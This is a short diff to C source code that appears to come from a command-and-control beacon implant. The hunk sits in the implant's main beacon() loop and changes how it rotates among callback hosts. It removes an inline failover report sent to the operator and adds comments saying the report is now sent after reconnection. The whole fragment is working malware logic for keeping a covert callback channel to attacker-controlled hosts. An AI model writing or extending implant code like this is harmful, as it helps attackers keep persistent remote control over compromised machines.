@@ -210,17 +210,13 @@ void beacon(LPVOID lpReserved) {
 
 		/* 4.10 beacon_config host 热换：覆盖层接管后每周期从这里取
 		 * host/uri（round-robin 跳 held）；未接管时走烘焙 strategy 路径 */
+		/* the move to another callback host is not reported here: a beacon
+		 * that has not checked in yet has no session to send with. The
+		 * opt-in notification goes out of hostcfg_note() once a connection
+		 * is re-established (beacon_config failover_notification). */
 		if (!hostcfg_pick(beacon_domain, 128, url, 256)) {
-			char prev_host[128];
-			_snprintf(prev_host, 128, "%s", beacon_domain);
 			_snprintf(beacon_domain, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
 			_snprintf(url, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
-			/* 4.13: the move to the next callback host is reported */
-			if (failedHost && prev_host[0] != 0 && strcmp(prev_host, beacon_domain) != 0) {
-				char note[300];
-				_snprintf(note, 300, "callback host %s failed, failing over to %s", prev_host, beacon_domain);
-				command_shell_callback(note, (int)strlen(note), CALLBACK_HOST_FAILOVER);
-			}
 		}
 		failedHost = FALSE;
 
